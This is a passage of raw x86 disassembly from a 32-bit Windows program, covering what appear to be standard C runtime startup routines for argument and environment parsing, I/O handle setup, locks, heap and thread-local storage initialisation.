  424cb0:	inc    eax
  424cb1:	inc    DWORD PTR [esi]
  424cb3:	inc    DWORD PTR [esi]
  424cb5:	inc    eax
  424cb6:	jmp    0x424c23
  424cbb:	test   edi,edi
  424cbd:	je     0x424cc3
  424cbf:	and    BYTE PTR [edi],0x0
  424cc2:	inc    edi
  424cc3:	inc    DWORD PTR [esi]
  424cc5:	mov    ebx,DWORD PTR [ebp+0xc]
  424cc8:	jmp    0x424bee
  424ccd:	mov    eax,DWORD PTR [ebp+0x8]
  424cd0:	test   eax,eax
  424cd2:	je     0x424cd7
  424cd4:	and    DWORD PTR [eax],0x0
  424cd7:	inc    DWORD PTR [ebx]
  424cd9:	pop    edi
  424cda:	pop    ebx
  424cdb:	leave  
  424cdc:	ret    
  424cdd:	push   ebp
  424cde:	mov    ebp,esp
  424ce0:	push   ecx
  424ce1:	push   ecx
  424ce2:	push   ebx
  424ce3:	push   esi
  424ce4:	push   edi
  424ce5:	xor    edi,edi
  424ce7:	cmp    DWORD PTR ds:0x46782c,edi
  424ced:	jne    0x424cf4
  424cef:	call   0x425e7c
  424cf4:	and    BYTE PTR ds:0x4671d4,0x0
  424cfb:	push   0x104
  424d00:	mov    esi,0x4670d0
  424d05:	push   esi
  424d06:	push   edi
  424d07:	call   DWORD PTR ds:0x429084
  424d0d:	mov    eax,ds:0x467834
  424d12:	cmp    eax,edi
  424d14:	mov    DWORD PTR ds:0x4670b4,esi
  424d1a:	je     0x424d23
  424d1c:	cmp    BYTE PTR [eax],0x0
  424d1f:	mov    ebx,eax
  424d21:	jne    0x424d25
  424d23:	mov    ebx,esi
  424d25:	lea    eax,[ebp-0x4]
  424d28:	push   eax
  424d29:	push   edi
  424d2a:	lea    esi,[ebp-0x8]
  424d2d:	xor    ecx,ecx
  424d2f:	mov    eax,ebx
  424d31:	call   0x424b71
  424d36:	mov    esi,DWORD PTR [ebp-0x4]
  424d39:	mov    eax,DWORD PTR [ebp-0x8]
  424d3c:	shl    esi,0x2
  424d3f:	add    eax,esi
  424d41:	push   eax
  424d42:	call   0x425fb2
  424d47:	mov    edi,eax
  424d49:	add    esp,0xc
  424d4c:	test   edi,edi
  424d4e:	jne    0x424d55
  424d50:	or     eax,0xffffffff
  424d53:	jmp    0x424d7a
  424d55:	lea    eax,[ebp-0x4]
  424d58:	push   eax
  424d59:	lea    ecx,[esi+edi*1]
  424d5c:	push   edi
  424d5d:	lea    esi,[ebp-0x8]
  424d60:	mov    eax,ebx
  424d62:	call   0x424b71
  424d67:	mov    eax,DWORD PTR [ebp-0x4]
  424d6a:	dec    eax
  424d6b:	pop    ecx
  424d6c:	mov    ds:0x467098,eax
  424d71:	pop    ecx
  424d72:	mov    DWORD PTR ds:0x46709c,edi
  424d78:	xor    eax,eax
  424d7a:	pop    edi
  424d7b:	pop    esi
  424d7c:	pop    ebx
  424d7d:	leave  
  424d7e:	ret    
  424d7f:	push   ecx
  424d80:	push   ecx
  424d81:	mov    eax,ds:0x4671d8
  424d86:	push   ebx
  424d87:	push   ebp
  424d88:	push   esi
  424d89:	push   edi
  424d8a:	mov    edi,DWORD PTR ds:0x42909c
  424d90:	xor    ebx,ebx
  424d92:	xor    esi,esi
  424d94:	cmp    eax,ebx
  424d96:	push   0x2
  424d98:	pop    ebp
  424d99:	jne    0x424dc8
  424d9b:	call   edi
  424d9d:	mov    esi,eax
  424d9f:	cmp    esi,ebx
  424da1:	je     0x424daf
  424da3:	mov    DWORD PTR ds:0x4671d8,0x1
  424dad:	jmp    0x424dcd
  424daf:	call   DWORD PTR ds:0x429034
  424db5:	cmp    eax,0x78
  424db8:	jne    0x424dc3
  424dba:	mov    eax,ebp
  424dbc:	mov    ds:0x4671d8,eax
  424dc1:	jmp    0x424dc8
  424dc3:	mov    eax,ds:0x4671d8
  424dc8:	cmp    eax,0x1
  424dcb:	jne    0x424e4a
  424dcd:	cmp    esi,ebx
  424dcf:	jne    0x424dd9
  424dd1:	call   edi
  424dd3:	mov    esi,eax
  424dd5:	cmp    esi,ebx
  424dd7:	je     0x424e52
  424dd9:	cmp    WORD PTR [esi],bx
  424ddc:	mov    eax,esi
  424dde:	je     0x424dee
  424de0:	add    eax,ebp
  424de2:	cmp    WORD PTR [eax],bx
  424de5:	jne    0x424de0
  424de7:	add    eax,ebp
  424de9:	cmp    WORD PTR [eax],bx
  424dec:	jne    0x424de0
  424dee:	mov    edi,DWORD PTR ds:0x429098
  424df4:	push   ebx
  424df5:	push   ebx
  424df6:	push   ebx
  424df7:	sub    eax,esi
  424df9:	push   ebx
  424dfa:	sar    eax,1
  424dfc:	inc    eax
  424dfd:	push   eax
  424dfe:	push   esi
  424dff:	push   ebx
  424e00:	push   ebx
  424e01:	mov    DWORD PTR [esp+0x34],eax
  424e05:	call   edi
  424e07:	mov    ebp,eax
  424e09:	cmp    ebp,ebx
  424e0b:	je     0x424e3f
  424e0d:	push   ebp
  424e0e:	call   0x425fb2
  424e13:	cmp    eax,ebx
  424e15:	pop    ecx
  424e16:	mov    DWORD PTR [esp+0x10],eax
  424e1a:	je     0x424e3f
  424e1c:	push   ebx
  424e1d:	push   ebx
  424e1e:	push   ebp
  424e1f:	push   eax
  424e20:	push   DWORD PTR [esp+0x24]
  424e24:	push   esi
  424e25:	push   ebx
  424e26:	push   ebx
  424e27:	call   edi
  424e29:	test   eax,eax
  424e2b:	jne    0x424e3b
  424e2d:	push   DWORD PTR [esp+0x10]
  424e31:	call   0x425e9a
  424e36:	pop    ecx
  424e37:	mov    DWORD PTR [esp+0x10],ebx
  424e3b:	mov    ebx,DWORD PTR [esp+0x10]
  424e3f:	push   esi
  424e40:	call   DWORD PTR ds:0x429094
  424e46:	mov    eax,ebx
  424e48:	jmp    0x424e9a
  424e4a:	cmp    eax,ebp
  424e4c:	je     0x424e56
  424e4e:	cmp    eax,ebx
  424e50:	je     0x424e56
  424e52:	xor    eax,eax
  424e54:	jmp    0x424e9a
  424e56:	call   DWORD PTR ds:0x429090
  424e5c:	mov    esi,eax
  424e5e:	cmp    esi,ebx
  424e60:	je     0x424e52
  424e62:	cmp    BYTE PTR [esi],bl
  424e64:	je     0x424e70
  424e66:	inc    eax
  424e67:	cmp    BYTE PTR [eax],bl
  424e69:	jne    0x424e66
  424e6b:	inc    eax
  424e6c:	cmp    BYTE PTR [eax],bl
  424e6e:	jne    0x424e66
  424e70:	sub    eax,esi
  424e72:	inc    eax
  424e73:	mov    ebp,eax
  424e75:	push   ebp
  424e76:	call   0x425fb2
  424e7b:	mov    edi,eax
  424e7d:	cmp    edi,ebx
  424e7f:	pop    ecx
  424e80:	jne    0x424e86
  424e82:	xor    edi,edi
  424e84:	jmp    0x424e91
  424e86:	push   ebp
  424e87:	push   esi
  424e88:	push   edi
  424e89:	call   0x425fd0
  424e8e:	add    esp,0xc
  424e91:	push   esi
  424e92:	call   DWORD PTR ds:0x42908c
  424e98:	mov    eax,edi
  424e9a:	pop    edi
  424e9b:	pop    esi
  424e9c:	pop    ebp
  424e9d:	pop    ebx
  424e9e:	pop    ecx
  424e9f:	pop    ecx
  424ea0:	ret    
  424ea1:	sub    esp,0x48
  424ea4:	push   ebx
  424ea5:	mov    ebx,0x480
  424eaa:	push   ebx
  424eab:	call   0x425fb2
  424eb0:	test   eax,eax
  424eb2:	pop    ecx
  424eb3:	jne    0x424ebd
  424eb5:	or     eax,0xffffffff
  424eb8:	jmp    0x42509a
  424ebd:	mov    ds:0x467720,eax
  424ec2:	mov    DWORD PTR ds:0x467708,0x20
  424ecc:	lea    ecx,[eax+0x480]
  424ed2:	jmp    0x424ef2
  424ed4:	and    BYTE PTR [eax+0x4],0x0
  424ed8:	or     DWORD PTR [eax],0xffffffff
  424edb:	and    DWORD PTR [eax+0x8],0x0
  424edf:	mov    BYTE PTR [eax+0x5],0xa
  424ee3:	mov    ecx,DWORD PTR ds:0x467720
  424ee9:	add    eax,0x24
  424eec:	add    ecx,0x480
  424ef2:	cmp    eax,ecx
  424ef4:	jb     0x424ed4
  424ef6:	push   ebp
  424ef7:	push   esi
  424ef8:	push   edi
  424ef9:	lea    eax,[esp+0x14]
  424efd:	push   eax
  424efe:	call   DWORD PTR ds:0x429064
  424f04:	cmp    WORD PTR [esp+0x46],0x0
  424f0a:	je     0x424ff9
  424f10:	mov    eax,DWORD PTR [esp+0x48]
  424f14:	test   eax,eax
  424f16:	je     0x424ff9
  424f1c:	mov    edi,DWORD PTR [eax]
  424f1e:	lea    ebp,[eax+0x4]
  424f21:	lea    eax,[edi+ebp*1]
  424f24:	mov    DWORD PTR [esp+0x10],eax
  424f28:	mov    eax,0x800
  424f2d:	cmp    edi,eax
  424f2f:	jl     0x424f33
  424f31:	mov    edi,eax
  424f33:	cmp    DWORD PTR ds:0x467708,edi
  424f39:	jge    0x424f89
  424f3b:	mov    esi,0x467724
  424f40:	push   ebx
  424f41:	call   0x425fb2
  424f46:	test   eax,eax
  424f48:	pop    ecx
  424f49:	je     0x424f83
  424f4b:	add    DWORD PTR ds:0x467708,0x20
  424f52:	mov    DWORD PTR [esi],eax
  424f54:	lea    ecx,[eax+0x480]
  424f5a:	jmp    0x424f72
  424f5c:	and    BYTE PTR [eax+0x4],0x0
  424f60:	or     DWORD PTR [eax],0xffffffff
  424f63:	and    DWORD PTR [eax+0x8],0x0
  424f67:	mov    BYTE PTR [eax+0x5],0xa
  424f6b:	mov    ecx,DWORD PTR [esi]
  424f6d:	add    eax,0x24
  424f70:	add    ecx,ebx
  424f72:	cmp    eax,ecx
  424f74:	jb     0x424f5c
  424f76:	add    esi,0x4
  424f79:	cmp    DWORD PTR ds:0x467708,edi
  424f7f:	jl     0x424f40
  424f81:	jmp    0x424f89
  424f83:	mov    edi,DWORD PTR ds:0x467708
  424f89:	xor    ebx,ebx
  424f8b:	test   edi,edi
  424f8d:	jle    0x424ff9
  424f8f:	mov    eax,DWORD PTR [esp+0x10]
  424f93:	mov    eax,DWORD PTR [eax]
  424f95:	cmp    eax,0xffffffff
  424f98:	je     0x424fee
  424f9a:	mov    cl,BYTE PTR [ebp+0x0]
  424f9d:	test   cl,0x1
  424fa0:	je     0x424fee
  424fa2:	test   cl,0x8
  424fa5:	jne    0x424fb2
  424fa7:	push   eax
  424fa8:	call   DWORD PTR ds:0x4290a4
  424fae:	test   eax,eax
  424fb0:	je     0x424fee
  424fb2:	mov    ecx,ebx
  424fb4:	mov    eax,ebx
  424fb6:	and    eax,0x1f
  424fb9:	lea    eax,[eax+eax*8]
  424fbc:	sar    ecx,0x5
  424fbf:	mov    ecx,DWORD PTR [ecx*4+0x467720]
  424fc6:	lea    esi,[ecx+eax*4]
  424fc9:	mov    eax,DWORD PTR [esp+0x10]
  424fcd:	mov    eax,DWORD PTR [eax]
  424fcf:	mov    DWORD PTR [esi],eax
  424fd1:	mov    al,BYTE PTR [ebp+0x0]
  424fd4:	mov    BYTE PTR [esi+0x4],al
  424fd7:	lea    eax,[esi+0xc]
  424fda:	push   0xfa0
  424fdf:	push   eax
  424fe0:	call   0x42631d
  424fe5:	test   eax,eax
  424fe7:	pop    ecx
  424fe8:	pop    ecx
  424fe9:	je     0x425019
  424feb:	inc    DWORD PTR [esi+0x8]
  424fee:	add    DWORD PTR [esp+0x10],0x4
  424ff3:	inc    ebx
  424ff4:	inc    ebp
  424ff5:	cmp    ebx,edi
  424ff7:	jl     0x424f8f
  424ff9:	xor    ebx,ebx
  424ffb:	mov    ecx,DWORD PTR ds:0x467720
  425001:	lea    eax,[ebx+ebx*8]
  425004:	lea    esi,[ecx+eax*4]
  425007:	cmp    DWORD PTR [esi],0xffffffff
  42500a:	jne    0x42507b
  42500c:	test   ebx,ebx
  42500e:	mov    BYTE PTR [esi+0x4],0x81
  425012:	jne    0x42501e
  425014:	push   0xfffffff6
  425016:	pop    eax
  425017:	jmp    0x425028
  425019:	or     eax,0xffffffff
  42501c:	jmp    0x425097
  42501e:	mov    eax,ebx
  425020:	dec    eax
  425021:	neg    eax
  425023:	sbb    eax,eax
  425025:	add    eax,0xfffffff5
  425028:	push   eax
  425029:	call   DWORD PTR ds:0x429080
  42502f:	mov    edi,eax
  425031:	cmp    edi,0xffffffff
  425034:	je     0x425075
  425036:	push   edi
  425037:	call   DWORD PTR ds:0x4290a4
  42503d:	test   eax,eax
  42503f:	je     0x425075
  425041:	and    eax,0xff
  425046:	cmp    eax,0x2
  425049:	mov    DWORD PTR [esi],edi
  42504b:	jne    0x425053
  42504d:	or     BYTE PTR [esi+0x4],0x40
  425051:	jmp    0x42505c
  425053:	cmp    eax,0x3
  425056:	jne    0x42505c
  425058:	or     BYTE PTR [esi+0x4],0x8
  42505c:	lea    eax,[esi+0xc]
  42505f:	push   0xfa0
  425064:	push   eax
  425065:	call   0x42631d
  42506a:	test   eax,eax
  42506c:	pop    ecx
  42506d:	pop    ecx
  42506e:	je     0x425019
  425070:	inc    DWORD PTR [esi+0x8]
  425073:	jmp    0x42507f
  425075:	or     BYTE PTR [esi+0x4],0x40
  425079:	jmp    0x42507f
  42507b:	or     BYTE PTR [esi+0x4],0x80
  42507f:	inc    ebx
  425080:	cmp    ebx,0x3
  425083:	jl     0x424ffb
  425089:	push   DWORD PTR ds:0x467708
  42508f:	call   DWORD PTR ds:0x4290a0
  425095:	xor    eax,eax
  425097:	pop    edi
  425098:	pop    esi
  425099:	pop    ebp
  42509a:	pop    ebx
  42509b:	add    esp,0x48
  42509e:	ret    
  42509f:	push   0xc
  4250a1:	push   0x429500
  4250a6:	call   0x425290
  4250ab:	mov    DWORD PTR [ebp-0x1c],0x429f58
  4250b2:	cmp    DWORD PTR [ebp-0x1c],0x429f58
  4250b9:	jae    0x4250dd
  4250bb:	and    DWORD PTR [ebp-0x4],0x0
  4250bf:	mov    eax,DWORD PTR [ebp-0x1c]
  4250c2:	mov    eax,DWORD PTR [eax]
  4250c4:	test   eax,eax
  4250c6:	je     0x4250d3
  4250c8:	call   eax
  4250ca:	jmp    0x4250d3
  4250cc:	xor    eax,eax
  4250ce:	inc    eax
  4250cf:	ret    
  4250d0:	mov    esp,DWORD PTR [ebp-0x18]
  4250d3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4250d7:	add    DWORD PTR [ebp-0x1c],0x4
  4250db:	jmp    0x4250b2
  4250dd:	call   0x4252cb
  4250e2:	ret    
  4250e3:	push   0xc
  4250e5:	push   0x429510
  4250ea:	call   0x425290
  4250ef:	mov    DWORD PTR [ebp-0x1c],0x429f60
  4250f6:	cmp    DWORD PTR [ebp-0x1c],0x429f60
  4250fd:	jae    0x425121
  4250ff:	and    DWORD PTR [ebp-0x4],0x0
  425103:	mov    eax,DWORD PTR [ebp-0x1c]
  425106:	mov    eax,DWORD PTR [eax]
  425108:	test   eax,eax
  42510a:	je     0x425117
  42510c:	call   eax
  42510e:	jmp    0x425117
  425110:	xor    eax,eax
  425112:	inc    eax
  425113:	ret    
  425114:	mov    esp,DWORD PTR [ebp-0x18]
  425117:	or     DWORD PTR [ebp-0x4],0xffffffff
  42511b:	add    DWORD PTR [ebp-0x1c],0x4
  42511f:	jmp    0x4250f6
  425121:	call   0x4252cb
  425126:	ret    
  425127:	call   0x425366
  42512c:	mov    eax,ds:0x4668bc
  425131:	cmp    eax,0xffffffff
  425134:	je     0x425144
  425136:	push   eax
  425137:	call   DWORD PTR ds:0x4290ac
  42513d:	or     DWORD PTR ds:0x4668bc,0xffffffff
  425144:	ret    
  425145:	push   ebx
  425146:	push   esi
  425147:	call   DWORD PTR ds:0x429034
  42514d:	push   DWORD PTR ds:0x4668bc
  425153:	mov    ebx,eax
  425155:	call   DWORD PTR ds:0x4290bc
  42515b:	mov    esi,eax
  42515d:	test   esi,esi
  42515f:	jne    0x4251aa
  425161:	push   0x88
  425166:	push   0x1
  425168:	call   0x4263a8
  42516d:	mov    esi,eax
  42516f:	test   esi,esi
  425171:	pop    ecx
  425172:	pop    ecx
  425173:	je     0x4251a2
  425175:	push   esi
  425176:	push   DWORD PTR ds:0x4668bc
  42517c:	call   DWORD PTR ds:0x4290b8
  425182:	test   eax,eax
  425184:	je     0x4251a2
  425186:	mov    DWORD PTR [esi+0x54],0x466810
  42518d:	mov    DWORD PTR [esi+0x14],0x1
  425194:	call   DWORD PTR ds:0x4290b4
  42519a:	or     DWORD PTR [esi+0x4],0xffffffff
  42519e:	mov    DWORD PTR [esi],eax
  4251a0:	jmp    0x4251aa
  4251a2:	push   0x10
  4251a4:	call   0x424358
  4251a9:	pop    ecx
  4251aa:	push   ebx
  4251ab:	call   DWORD PTR ds:0x4290b0
  4251b1:	mov    eax,esi
  4251b3:	pop    esi
  4251b4:	pop    ebx
  4251b5:	ret    
  4251b6:	call   0x42531d
  4251bb:	test   eax,eax
  4251bd:	je     0x4251cf
  4251bf:	call   DWORD PTR ds:0x4290c0
  4251c5:	cmp    eax,0xffffffff
  4251c8:	mov    ds:0x4668bc,eax
  4251cd:	jne    0x4251d7
  4251cf:	call   0x425127
  4251d4:	xor    eax,eax
  4251d6:	ret    
  4251d7:	push   esi
  4251d8:	push   0x88
  4251dd:	push   0x1
  4251df:	call   0x4263a8
  4251e4:	mov    esi,eax
  4251e6:	test   esi,esi
  4251e8:	pop    ecx
  4251e9:	pop    ecx
  4251ea:	je     0x42521c
  4251ec:	push   esi
  4251ed:	push   DWORD PTR ds:0x4668bc
  4251f3:	call   DWORD PTR ds:0x4290b8
  4251f9:	test   eax,eax
  4251fb:	je     0x42521c
  4251fd:	mov    DWORD PTR [esi+0x54],0x466810
  425204:	mov    DWORD PTR [esi+0x14],0x1
  42520b:	call   DWORD PTR ds:0x4290b4
  425211:	or     DWORD PTR [esi+0x4],0xffffffff
  425215:	mov    DWORD PTR [esi],eax
  425217:	xor    eax,eax
  425219:	inc    eax
  42521a:	pop    esi
  42521b:	ret    
  42521c:	call   0x425127
  425221:	xor    eax,eax
  425223:	pop    esi
  425224:	ret    
  425225:	cmp    DWORD PTR ds:0x467084,0x2
  42522c:	jne    0x42523b
  42522e:	cmp    DWORD PTR ds:0x467090,0x5
  425235:	jb     0x42523b
  425237:	xor    eax,eax
  425239:	inc    eax
  42523a:	ret    
  42523b:	push   0x3
  42523d:	pop    eax
  42523e:	ret    
  42523f:	xor    eax,eax
  425241:	cmp    DWORD PTR [esp+0x4],eax
  425245:	push   0x0
  425247:	sete   al
  42524a:	push   0x1000
  42524f:	push   eax
  425250:	call   DWORD PTR ds:0x429038
  425256:	test   eax,eax
  425258:	mov    ds:0x467700,eax
  42525d:	je     0x425289
  42525f:	call   0x425225
  425264:	cmp    eax,0x3
  425267:	mov    ds:0x467704,eax
  42526c:	jne    0x42528c
  42526e:	push   0x3f8
  425273:	call   0x42662a
  425278:	test   eax,eax
  42527a:	pop    ecx
  42527b:	jne    0x42528c
  42527d:	push   DWORD PTR ds:0x467700
  425283:	call   DWORD PTR ds:0x429020
  425289:	xor    eax,eax
  42528b:	ret    
  42528c:	xor    eax,eax
  42528e:	inc    eax
  42528f:	ret    
  425290:	push   0x427158
  425295:	mov    eax,fs:0x0
  42529b:	push   eax
  42529c:	mov    eax,DWORD PTR [esp+0x10]
  4252a0:	mov    DWORD PTR [esp+0x10],ebp
  4252a4:	lea    ebp,[esp+0x10]
  4252a8:	sub    esp,eax
  4252aa:	push   ebx
  4252ab:	push   esi
  4252ac:	push   edi
  4252ad:	mov    eax,DWORD PTR [ebp-0x8]
  4252b0:	mov    DWORD PTR [ebp-0x18],esp
  4252b3:	push   eax
  4252b4:	mov    eax,DWORD PTR [ebp-0x4]
  4252b7:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4252be:	mov    DWORD PTR [ebp-0x8],eax
  4252c1:	lea    eax,[ebp-0x10]
  4252c4:	mov    fs:0x0,eax
  4252ca:	ret    
  4252cb:	mov    ecx,DWORD PTR [ebp-0x10]
  4252ce:	mov    DWORD PTR fs:0x0,ecx
  4252d5:	pop    ecx
  4252d6:	pop    edi
  4252d7:	pop    esi
  4252d8:	pop    ebx
  4252d9:	leave  
  4252da:	push   ecx
  4252db:	ret    
  4252dc:	int3   
  4252dd:	int3   
  4252de:	int3   
  4252df:	int3   
  4252e0:	cmp    eax,0x1000
  4252e5:	jae    0x4252f5
  4252e7:	neg    eax
  4252e9:	add    eax,esp
  4252eb:	add    eax,0x4
  4252ee:	test   DWORD PTR [eax],eax
  4252f0:	xchg   esp,eax
  4252f1:	mov    eax,DWORD PTR [eax]
  4252f3:	push   eax
  4252f4:	ret    
  4252f5:	push   ecx
  4252f6:	lea    ecx,[esp+0x8]
  4252fa:	sub    ecx,0x1000
  425300:	sub    eax,0x1000
  425305:	test   DWORD PTR [ecx],eax
  425307:	cmp    eax,0x1000
  42530c:	jae    0x4252fa
  42530e:	sub    ecx,eax
  425310:	mov    eax,esp
  425312:	test   DWORD PTR [ecx],eax
  425314:	mov    esp,ecx
  425316:	mov    ecx,DWORD PTR [eax]
  425318:	mov    eax,DWORD PTR [eax+0x4]
  42531b:	push   eax
  42531c:	ret    
  42531d:	push   esi
  42531e:	push   edi
  42531f:	xor    esi,esi
  425321:	mov    edi,0x4671e0
  425326:	cmp    DWORD PTR [esi*8+0x4668d4],0x1
  42532e:	jne    0x42534e
  425330:	lea    eax,[esi*8+0x4668d0]
  425337:	mov    DWORD PTR [eax],edi
  425339:	push   0xfa0
  42533e:	push   DWORD PTR [eax]
  425340:	add    edi,0x18
  425343:	call   0x42631d
  425348:	test   eax,eax
  42534a:	pop    ecx
  42534b:	pop    ecx
  42534c:	je     0x42535a
  42534e:	inc    esi
  42534f:	cmp    esi,0x24
  425352:	jl     0x425326
  425354:	xor    eax,eax
  425356:	inc    eax
  425357:	pop    edi
  425358:	pop    esi
  425359:	ret    
  42535a:	and    DWORD PTR [esi*8+0x4668d0],0x0
  425362:	xor    eax,eax
  425364:	jmp    0x425357
  425366:	push   ebx
  425367:	mov    ebx,DWORD PTR ds:0x4290a8
  42536d:	push   esi
  42536e:	mov    esi,0x4668d0
  425373:	push   edi
  425374:	mov    edi,DWORD PTR [esi]
  425376:	test   edi,edi
  425378:	je     0x42538d
  42537a:	cmp    DWORD PTR [esi+0x4],0x1
  42537e:	je     0x42538d
  425380:	push   edi
  425381:	call   ebx
  425383:	push   edi
  425384:	call   0x425e9a
  425389:	and    DWORD PTR [esi],0x0
  42538c:	pop    ecx
  42538d:	add    esi,0x8
  425390:	cmp    esi,0x4669f0
  425396:	jl     0x425374
  425398:	mov    esi,0x4668d0
  42539d:	pop    edi
  42539e:	mov    eax,DWORD PTR [esi]
  4253a0:	test   eax,eax
  4253a2:	je     0x4253ad
  4253a4:	cmp    DWORD PTR [esi+0x4],0x1
  4253a8:	jne    0x4253ad
  4253aa:	push   eax
  4253ab:	call   ebx
  4253ad:	add    esi,0x8
  4253b0:	cmp    esi,0x4669f0
  4253b6:	jl     0x42539e
  4253b8:	pop    esi
  4253b9:	pop    ebx
  4253ba:	ret    
  4253bb:	push   ebp
  4253bc:	mov    ebp,esp
  4253be:	mov    eax,DWORD PTR [ebp+0x8]
  4253c1:	push   DWORD PTR [eax*8+0x4668d0]
  4253c8:	call   DWORD PTR ds:0x4290c4
  4253ce:	pop    ebp
  4253cf:	ret    
  4253d0:	push   ebp
  4253d1:	mov    ebp,esp
  4253d3:	push   esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x8]
  4253d7:	lea    esi,[esi*8+0x4668d0]
  4253de:	cmp    DWORD PTR [esi],0x0
  4253e1:	je     0x4253e8
  4253e3:	xor    eax,eax
  4253e5:	inc    eax
  4253e6:	jmp    0x42544c
  4253e8:	push   edi
  4253e9:	push   0x18
  4253eb:	call   0x425fb2
  4253f0:	mov    edi,eax
  4253f2:	test   edi,edi
  4253f4:	pop    ecx
  4253f5:	jne    0x425406
  4253f7:	call   0x427230
  4253fc:	mov    DWORD PTR [eax],0xc
  425402:	xor    eax,eax
  425404:	jmp    0x42544b
  425406:	push   0xa
  425408:	call   0x42544f
  42540d:	cmp    DWORD PTR [esi],0x0
  425410:	pop    ecx
  425411:	jne    0x425439
  425413:	push   0xfa0
  425418:	push   edi
  425419:	call   0x42631d
  42541e:	test   eax,eax
  425420:	pop    ecx
  425421:	pop    ecx
  425422:	jne    0x425435
  425424:	push   edi
  425425:	call   0x425e9a
  42542a:	push   0xa
  42542c:	call   0x4253bb
  425431:	pop    ecx
  425432:	pop    ecx
  425433:	jmp    0x4253f7
  425435:	mov    DWORD PTR [esi],edi
  425437:	jmp    0x425440
  425439:	push   edi
  42543a:	call   0x425e9a
  42543f:	pop    ecx
  425440:	push   0xa
  425442:	call   0x4253bb
  425447:	xor    eax,eax
  425449:	pop    ecx
  42544a:	inc    eax
  42544b:	pop    edi
  42544c:	pop    esi
  42544d:	pop    ebp
  42544e:	ret    
  42544f:	push   ebp
  425450:	mov    ebp,esp
  425452:	mov    eax,DWORD PTR [ebp+0x8]
  425455:	push   esi
  425456:	lea    esi,[eax*8+0x4668d0]
  42545d:	cmp    DWORD PTR [esi],0x0
  425460:	jne    0x425475
  425462:	push   eax
  425463:	call   0x4253d0
  425468:	test   eax,eax
  42546a:	pop    ecx
  42546b:	jne    0x425475
  42546d:	push   0x11
  42546f:	call   0x424358
  425474:	pop    ecx
  425475:	push   DWORD PTR [esi]
  425477:	call   DWORD PTR ds:0x4290c8
  42547d:	pop    esi
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   esi
  425481:	push   DWORD PTR ds:0x467828
  425487:	call   0x4273e6
  42548c:	pop    ecx
  42548d:	mov    ecx,DWORD PTR ds:0x467824
  425493:	mov    esi,eax
  425495:	mov    eax,ds:0x467828
  42549a:	mov    edx,ecx
  42549c:	sub    edx,eax
  42549e:	add    edx,0x4
  4254a1:	cmp    esi,edx
  4254a3:	jae    0x4254f3
  4254a5:	mov    ecx,0x800
  4254aa:	cmp    esi,ecx
  4254ac:	jae    0x4254b0
  4254ae:	mov    ecx,esi
  4254b0:	add    ecx,esi
  4254b2:	push   ecx
  4254b3:	push   eax
  4254b4:	call   0x427239
  4254b9:	test   eax,eax
  4254bb:	pop    ecx
  4254bc:	pop    ecx
  4254bd:	jne    0x4254d6
  4254bf:	add    esi,0x10
  4254c2:	push   esi
  4254c3:	push   DWORD PTR ds:0x467828
  4254c9:	call   0x427239
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254d6
  4254d4:	pop    esi
  4254d5:	ret    
  4254d6:	mov    ecx,DWORD PTR ds:0x467824
  4254dc:	sub    ecx,DWORD PTR ds:0x467828
  4254e2:	mov    ds:0x467828,eax
  4254e7:	sar    ecx,0x2
  4254ea:	lea    ecx,[eax+ecx*4]
  4254ed:	mov    DWORD PTR ds:0x467824,ecx
  4254f3:	mov    DWORD PTR [ecx],edi
  4254f5:	add    DWORD PTR ds:0x467824,0x4
  4254fc:	mov    eax,edi
  4254fe:	pop    esi
  4254ff:	ret    
  425500:	push   0x80
  425505:	call   0x425fb2
  42550a:	test   eax,eax
  42550c:	pop    ecx
  42550d:	mov    ds:0x467828,eax
  425512:	jne    0x425518
  425514:	push   0x18
  425516:	pop    eax
  425517:	ret    
  425518:	and    DWORD PTR [eax],0x0
  42551b:	mov    eax,ds:0x467828
  425520:	mov    ds:0x467824,eax
  425525:	xor    eax,eax
  425527:	ret    
  425528:	push   0xc
  42552a:	push   0x429520
  42552f:	call   0x425290
  425534:	call   0x4245a3
  425539:	and    DWORD PTR [ebp-0x4],0x0
  42553d:	mov    edi,DWORD PTR [ebp+0x8]
  425540:	call   0x425480
  425545:	mov    DWORD PTR [ebp-0x1c],eax
  425548:	or     DWORD PTR [ebp-0x4],0xffffffff
  42554c:	call   0x42555a
  425551:	mov    eax,DWORD PTR [ebp-0x1c]
  425554:	call   0x4252cb
  425559:	ret    
  42555a:	call   0x4245ac
  42555f:	ret    
  425560:	push   DWORD PTR [esp+0x4]
  425564:	call   0x425528
  425569:	neg    eax
  42556b:	sbb    eax,eax
  42556d:	neg    eax
  42556f:	pop    ecx
  425570:	dec    eax
  425571:	ret    
  425572:	push   ebp
  425573:	mov    ebp,esp
  425575:	sub    esp,0x10
  425578:	push   ebx
  425579:	xor    ebx,ebx
  42557b:	cmp    DWORD PTR ds:0x467330,ebx
  425581:	push   esi
  425582:	push   edi
  425583:	jne    0x4255f2
  425585:	push   0x429590
  42558a:	call   DWORD PTR ds:0x4290cc
  425590:	mov    edi,eax
  425592:	cmp    edi,ebx
  425594:	je     0x42562d
  42559a:	mov    esi,DWORD PTR ds:0x429048
  4255a0:	push   0x429584
  4255a5:	push   edi
  4255a6:	call   esi
  4255a8:	test   eax,eax
  4255aa:	mov    ds:0x467330,eax
  4255af:	je     0x42562d
  4255b1:	push   0x429574
  4255b6:	push   edi
  4255b7:	call   esi
  4255b9:	push   0x429560
  4255be:	push   edi
  4255bf:	mov    ds:0x467334,eax
  4255c4:	call   esi
  4255c6:	cmp    DWORD PTR ds:0x467084,0x2
  4255cd:	mov    ds:0x467338,eax
  4255d2:	jne    0x4255f2
  4255d4:	push   0x429544
  4255d9:	push   edi
  4255da:	call   esi
  4255dc:	test   eax,eax
  4255de:	mov    ds:0x467340,eax
  4255e3:	je     0x4255f2
  4255e5:	push   0x42952c
  4255ea:	push   edi
  4255eb:	call   esi
  4255ed:	mov    ds:0x46733c,eax
  4255f2:	mov    eax,ds:0x46733c
  4255f7:	test   eax,eax
  4255f9:	je     0x425637
  4255fb:	call   eax
  4255fd:	test   eax,eax
  4255ff:	je     0x42561e
  425601:	lea    ecx,[ebp-0x4]
  425604:	push   ecx
  425605:	push   0xc
  425607:	lea    ecx,[ebp-0x10]
  42560a:	push   ecx
  42560b:	push   0x1
  42560d:	push   eax
  42560e:	call   DWORD PTR ds:0x467340
  425614:	test   eax,eax
